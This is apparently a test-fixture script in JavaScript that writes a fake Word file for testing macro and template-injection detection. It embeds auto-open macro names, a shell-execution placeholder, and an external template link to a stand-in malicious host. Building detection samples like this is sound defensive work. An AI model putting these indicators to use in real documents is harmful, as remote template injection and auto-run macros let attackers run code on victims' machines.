import fs from 'fs';

// Minimal PK zip header signature 0x50 0x4B 0x03 0x04 containing vbaProject.bin and TargetMode="External"
const docxContent = Buffer.from(
  'PK\x03\x04\x14\x00\x00\x00\x08\x00word/vbaProject.bin' +
  'AutoOpen Document_Open VBA_MACRO_PAYLOAD_EXECUTE_SHELL' +
  'word/_rels/settings.xml.rels TargetMode="External" Target="http://evil-template-injection.xyz/malicious.dotm"'
);

fs.writeFileSync('tests/samples/sample_macro.docx', docxContent);
console.log('Created sample_macro.docx successfully:', docxContent.length, 'bytes');
